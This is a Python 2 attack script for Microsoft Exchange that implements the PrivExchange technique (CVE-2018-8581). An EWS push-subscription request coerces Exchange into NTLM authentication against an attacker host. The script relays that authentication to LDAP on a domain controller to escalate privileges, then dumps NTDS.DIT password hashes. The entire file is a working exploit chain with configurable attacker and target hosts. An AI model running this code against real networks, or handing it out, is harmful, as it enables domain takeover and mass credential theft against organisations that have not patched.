#!/usr/bin/env python
# -*- coding: UTF-8 -*-
import ssl
import argparse
import logging
import sys
import getpass
import base64
import re
import binascii
import time
import config
import xml.etree.ElementTree as ET
from httplib import HTTPConnection, HTTPSConnection, ResponseNotReady
from impacket import ntlm
from comm import logger
from comm.ntlmrelayx.servers import SMBRelayServer, HTTPRelayServer
from comm.ntlmrelayx.utils.config import NTLMRelayxConfig
from comm.ntlmrelayx.utils.targetsutils import TargetsProcessor
from comm.ntlmrelayx.clients import PROTOCOL_CLIENTS
from comm.ntlmrelayx.attacks import PROTOCOL_ATTACKS
from multiprocessing import Manager
from threading import Thread, Lock, currentThread
from comm.secretsdump import DumpSecrets

# Init logging
logger.init()
logging.getLogger().setLevel(logging.INFO)
start = time.time()
LOGO =R"""
▓█████ ▒██   ██▒ ▄████▄   ██░ ██  ▄▄▄       ███▄    █   ▄████ ▓█████ 
▓█   ▀ ▒▒ █ █ ▒░▒██▀ ▀█  ▓██░ ██▒▒████▄     ██ ▀█   █  ██▒ ▀█▒▓█   ▀ 
▒███   ░░  █   ░▒▓█    ▄ ▒██▀▀██░▒██  ▀█▄  ▓██  ▀█ ██▒▒██░▄▄▄░▒███   
▒▓█  ▄  ░ █ █ ▒ ▒▓▓▄ ▄██▒░▓█ ░██ ░██▄▄▄▄██ ▓██▒  ▐▌██▒░▓█  ██▓▒▓█  ▄ 
░▒████▒▒██▒ ▒██▒▒ ▓███▀ ░░▓█▒░██▓ ▓█   ▓██▒▒██░   ▓██░░▒▓███▀▒░▒████▒
░░ ▒░ ░▒▒ ░ ░▓ ░░ ░▒ ▒  ░ ▒ ░░▒░▒ ▒▒   ▓▒█░░ ▒░   ▒ ▒  ░▒   ▒ ░░ ▒░ ░
 ░ ░  ░░░   ░▒ ░  ░  ▒    ▒ ░▒░ ░  ▒   ▒▒ ░░ ░░   ░ ▒░  ░   ░  ░ ░  ░
   ░    ░    ░  ░         ░  ░░ ░  ░   ▒      ░   ░ ░ ░ ░   ░    ░   
   ░  ░ ░    ░  ░ ░       ░  ░  ░      ░  ░         ░       ░    ░  ░
                ░                                                    
"""

# SOAP request for EWS
# Source: https://docs.microsoft.com/en-us/exchange/client-developer/web-service-reference/subscribe-operation
# Credits: https://www.thezdi.com/blog/2018/12/19/an-insincere-form-of-flattery-impersonating-users-on-microsoft-exchange
POST_BODY = '''<?xml version="1.0" encoding="UTF-8"?>
<soap:Envelope xmlns:soap="http://schemas.xmlsoap.org/soap/envelope/"
               xmlns:t="http://schemas.microsoft.com/exchange/services/2006/types"
               xmlns:m="http://schemas.microsoft.com/exchange/services/2006/messages">
   <soap:Header>
      <t:RequestServerVersion Version="%s" />
   </soap:Header>
   <soap:Body >
      <m:Subscribe>
         <m:PushSubscriptionRequest SubscribeToAllFolders="true">
            <t:EventTypes>
              <t:EventType>NewMailEvent</t:EventType>
              <t:EventType>ModifiedEvent</t:EventType>
              <t:EventType>MovedEvent</t:EventType>
            </t:EventTypes>
            <t:StatusFrequency>1</t:StatusFrequency>
            <t:URL>%s</t:URL>
         </m:PushSubscriptionRequest>
      </m:Subscribe>
   </soap:Body>
</soap:Envelope>
'''



def startServers(passargs):
    targetSystem = passargs.target_host
    privuser = passargs.user
    PoppedDB		= Manager().dict()	# A dict of PoppedUsers
    PoppedDB_Lock	= Lock()			# A lock for opening the dict
    relayServers 	=  [HTTPRelayServer]
    serverThreads 	= []
    for server in relayServers:
        c = NTLMRelayxConfig()
        c.setProtocolClients(PROTOCOL_CLIENTS)
        c.setTargets(TargetsProcessor(singleTarget=str("ldap://"+targetSystem),protocolClients=PROTOCOL_CLIENTS))
        c.setOutputFile(None)
        c.setEncoding('ascii')
        c.setMode('RELAY')
        c.setAttacks(PROTOCOL_ATTACKS)
        c.setLootdir('.')
        c.setInterfaceIp("0.0.0.0")
        c.setInterfacePort(int(passargs.attacker_port))
        c.setLDAPOptions(True, True, True, privuser)
        c.PoppedDB 		= PoppedDB 		# pass the poppedDB to the relay servers
        c.PoppedDB_Lock = PoppedDB_Lock # pass the poppedDB to the relay servers
        s = server(c)
        s.start()
        serverThreads.append(s)
    logging.info("Relay servers started, waiting for connection....")
    try:
        status = exploit(passargs)
        if status:
            exp = Thread(target=checkauth, args=(passargs,))
            exp.daemon = True
            exp.start()
            try:
                while exp.isAlive():
                    pass
            except KeyboardInterrupt, e:
                logging.info("Shutting down...")
                for thread in serverThreads:
                    thread.server.shutdown()
        else:
            logging.error("Error in exploit, Shutting down...")
            for thread in serverThreads:
                thread.server.shutdown()
    except:
        logging.error("Error in exploit, Shutting down...")
        logging.info("Shutting down...")


def checkauth(passargs):
    suc = config.get_suc()
    logging.info("Waiting for Auth...")
    while True:
        if suc == True:
            gethash(passargs)
            break
        else:
            suc = config.get_suc()
            fal = config.get_fail()
            if fal == True:
                logging.error("Get auth failed, exiting...")
                break
            else:
                tmp = time.time() - start
                if tmp > passargs.timeout:
                    logging.error("Time Out. exiting...")
                    break
                
def gethash(passargs):
    remoteName = passargs.target_host
    username = passargs.user
    password = passargs.password
    domain = passargs.domain
    execmethod = passargs.exec_method
    if passargs.just_dc_user:
        dcuser = passargs.just_dc_user
    else:
        dcuser = None
    getpriv = config.get_priv()
    while True:
        if getpriv == True:
            dumper = DumpSecrets(remoteName, username, password, domain,execmethod,dcuser)
            try:
                check = dumper.dump()
                break
            except Exception, e:
                if logging.getLogger().level == logging.DEBUG:
                    import traceback
                    traceback.print_exc()
                logging.error(e)
        else:
            getpriv = config.get_priv()

    restore = config.get_restore()
    logging.critical("Backup old SD for restore => {}".format(restore))
    logging.info("Install aclpwn with: pip install aclpwn")
    logging.info(
        "You can restore with aclpwn use this command below after dump the NTLM of Exhcange$")
    logging.critical('Command: aclpwn -r {}'.format(restore))


def exploit(args):
    ews_url = "/EWS/Exchange.asmx"
    exchange_version  = args.exchange_version
    # Should we log debug stuff?
    if args.debug is True:
        logging.getLogger().setLevel(logging.DEBUG)

    if args.password is None and args.hashes is None:
        args.password = getpass.getpass()

    # Init connection
    if not args.no_ssl:
        # HTTPS = default
        port = 443
        if args.exchange_port:
            port = int(args.exchange_port)
        try:
            uv_context = ssl.SSLContext(ssl.PROTOCOL_SSLv23)
            session = HTTPSConnection(args.host, port, timeout=10,context=uv_context)
        except AttributeError:
            session = HTTPSConnection(args.host, port, timeout=10)
    else:
        # Otherwise: HTTP
        port = 80
        if args.exchange_port:
            port = int(args.exchange_port)
        session = HTTPConnection(args.host, port, timeout=10)

    # Construct attacker url
    if args.attacker_port != 80:
        attacker_url = 'http://%s:%d%s' % (args.attacker_host, int(args.attacker_port), args.attacker_page)
    else:
        attacker_url = 'http://%s%s' % (args.attacker_host, args.attacker_page)

    logging.info('Using attacker URL: %s', attacker_url)
    # Use impacket for NTLM
    ntlm_nego = ntlm.getNTLMSSPType1(args.attacker_host, domain=args.domain)
    #Negotiate auth
    negotiate = base64.b64encode(ntlm_nego.getData())
    # Headers
    # Source: https://github.com/thezdi/PoC/blob/master/CVE-2018-8581/Exch_EWS_pushSubscribe.py
    headers = {
        "Authorization": 'NTLM %s' % negotiate,
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Translate": "F"
    }

    session.request("POST", ews_url, POST_BODY % (exchange_version,attacker_url), headers)

    res = session.getresponse()
    res.read()

    # Copied from ntlmrelayx httpclient.py
    if res.status != 401:
        logging.info('Status code returned: %d. Authentication does not seem required for URL', res.status)
    try:
        if 'NTLM' not in res.getheader('WWW-Authenticate'):
            logging.error('NTLM Auth not offered by URL, offered protocols: %s', res.getheader('WWW-Authenticate'))
            return False
    except (KeyError, TypeError):
        logging.error('No authentication requested by the server for url %s', ews_url)
        return False

    logging.debug('Got 401, performing NTLM authentication')
    # Get negotiate data
    try:
        ntlm_challenge_b64 = re.search('NTLM ([a-zA-Z0-9+/]+={0,2})', res.getheader('WWW-Authenticate')).group(1)
        ntlm_challenge = base64.b64decode(ntlm_challenge_b64)
    except (IndexError, KeyError, AttributeError):
        logging.error('No NTLM challenge returned from server')
        return False

    if args.hashes:
        lm_hash_h, nt_hash_h = args.hashes.split(':')
        # Convert to binary format
        lm_hash = binascii.unhexlify(lm_hash_h)
        nt_hash = binascii.unhexlify(nt_hash_h)
        args.password = ''
    else:
        nt_hash = ''
        lm_hash = ''

    ntlm_auth, _ = ntlm.getNTLMSSPType3(ntlm_nego, ntlm_challenge, args.user, args.password, args.domain, lm_hash, nt_hash)
    auth = base64.b64encode(ntlm_auth.getData())
    #print("Get Auth: "+auth)
    headers = {
        "Authorization": 'NTLM %s' % auth,
        "Content-type": "text/xml; charset=utf-8",
        "Accept": "text/xml",
        "User-Agent": "ExchangeServicesClient/0.0.0.0",
        "Translate": "F"
    }


    session.request("POST", ews_url, POST_BODY % (exchange_version,attacker_url), headers)
    res = session.getresponse()

    logging.debug('HTTP status: %d', res.status)
    body = res.read()
    logging.debug('Body returned: %s', body)
    if res.status == 200:
        logging.info('Exchange returned HTTP status 200 - authentication was OK')
        # Parse XML with ElementTree
        root = ET.fromstring(body)
        code = None
        for response in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseCode'):
            code = response.text
        if not code:
            logging.error('Could not find response code element in body: %s', body)
            return False
        if code == 'NoError':
            logging.critical('API call was successful')
            return True
        elif code == 'ErrorMissingEmailAddress':
            logging.error('The user you authenticated with does not have a mailbox associated. Try a different user.')
            return False
        else:
            logging.error('Unknown error %s', code)
            for errmsg in root.iter('{http://schemas.microsoft.com/exchange/services/2006/messages}ResponseMessages'):
                logging.error('Server returned: %s', errmsg.text)
            return False
    elif res.status == 401:
        logging.error('Server returned HTTP status 401 - authentication failed')
        return False
    else:
        logging.error('Server returned HTTP %d: %s', res.status, body)
        return True




def main():
    parser = argparse.ArgumentParser(description='Exchange your privileges for Domain Admin privs by abusing Exchange. Use me with ntlmrelayx')
    parser.add_argument("host", type=str, metavar='HOSTNAME', help="Hostname/ip of the Exchange server")
    parser.add_argument("-u", "--user", metavar='USERNAME', help="username for authentication")
    parser.add_argument("-d", "--domain", metavar='DOMAIN', help="domain the user is in (FQDN or NETBIOS domain name)")
    parser.add_argument("-p", "--password", metavar='PASSWORD', help="Password for authentication, will prompt if not specified and no NT:NTLM hashes are supplied")
    parser.add_argument('--hashes', action='store', help='LM:NLTM hashes')
    parser.add_argument("--no-ssl", action='store_true', help="Don't use HTTPS (connects on port 80)")
    parser.add_argument("--exchange-port", help="Alternative EWS port (default: 443 or 80)")
    parser.add_argument("-ah", "--attacker-host", required=True, help="Attacker hostname or IP")
    parser.add_argument("-ap", "--attacker-port", default=80, help="Port on which the relay attack runs (default: 80)")
    parser.add_argument("-th", "--target-host", required=True, help="Hostname or IP of the DC")
    parser.add_argument("-t", "--timeout", default='120',type=int, help='timeout in seconds')
    parser.add_argument('--exec-method', choices=['smbexec', 'wmiexec', 'mmcexec'], nargs='?', default='smbexec', help='Remote exec '
                        'method to use at target (only when using -use-vss). Default: smbexec')
    parser.add_argument("--exchange-version",default='Exchange2013',help='Exchange version of the target (default: Exchange2013, choices:Exchange2010,Exchange2010_SP1,Exchange2010_SP2,Exchange2013,Exchange2013_SP1,Exchange2016)',)
    parser.add_argument("--attacker-page", default="/privexchange/", help="Page to request on attacker server (default: /privexchange/)")
    parser.add_argument('--just-dc-user', action='store', metavar='USERNAME',
                        help='Extract only NTDS.DIT data for the user specified. Only available for DRSUAPI approach.')
    parser.add_argument("--debug", action='store_true', help='Enable debug output')
    passargs = parser.parse_args()
    startServers(passargs)

if __name__ == '__main__':
    print(LOGO)
    main()
